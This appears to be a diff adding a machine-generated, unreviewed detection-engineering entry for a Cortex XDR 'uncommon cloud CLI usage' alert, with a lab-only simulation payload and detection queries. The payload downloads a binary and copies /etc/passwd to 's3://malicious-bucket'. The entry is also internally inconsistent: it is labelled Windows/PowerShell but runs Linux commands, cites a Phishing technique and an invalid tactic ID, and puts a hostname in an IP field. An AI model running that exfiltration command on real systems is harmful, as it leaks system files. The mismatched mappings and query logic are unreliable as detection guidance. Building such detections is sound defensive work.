@@ -1,0 +1,184 @@
+{
+  "id": "TTP-0000-0243",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Uncommon Cloud CLI Tool Usage via AWS CLI",
+    "summary": "An attacker uses awscli to upload a file to S3, triggering an ABIOC for uncommon cloud CLI usage. Cortex should detect the unusual process behavior and network connection to AWS.",
+    "description": "An attacker uses awscli to upload a file to S3, triggering an ABIOC for uncommon cloud CLI usage. Cortex should detect the unusual process behavior and network connection to AWS."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1566",
+        "name": "Phishing",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1531",
+        "name": "T1531",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget -O /tmp/awscli https://example.com/awscli\nchmod +x /tmp/awscli\n/tmp/awscli configure set aws_access_key_id fakekey\n/tmp/awscli configure set aws_secret_access_key fakesecret\n/tmp/awscli s3 cp /etc/passwd s3://malicious-bucket/passwd\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "AWS CLI process execution",
+        "expected_value": "action_process_image_name = '/tmp/awscli'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to AWS S3 endpoint",
+        "expected_value": "action_remote_ip = 's3.amazonaws.com'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon Cloud CLI Process Start",
+        "description": "Detection of AWS CLI being executed from non-standard location",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/awscli'\n| filter actor_process_image_name != 'bash'\n| filter actor_process_image_name != 'sh'",
+        "mitre_technique_ids": [
+          "T1059",
+          "T1566"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Uncommon Cloud CLI Usage Behavior",
+        "description": "ML-based detection of AWS CLI being used in unexpected way for file upload",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/awscli'\n| filter action_file_path = '/etc/passwd'\n| filter action_remote_ip = 's3.amazonaws.com'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start",
+        "mitre_technique_ids": [
+          "T1566",
+          "T1059",
+          "T1531"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "AWS CLI Process Start with S3 Upload",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/awscli'\n| filter action_file_path = '/etc/passwd'\n| filter action_remote_ip = 's3.amazonaws.com'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon cloud CLI tool usage; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-cloud-cli-tool-usage"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon cloud CLI tool usage",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-cloud-cli-tool-usage",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1566",
+      "url": "https://attack.mitre.org/techniques/T1566/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059",
+      "url": "https://attack.mitre.org/techniques/T1059/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1531",
+      "url": "https://attack.mitre.org/techniques/T1531/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
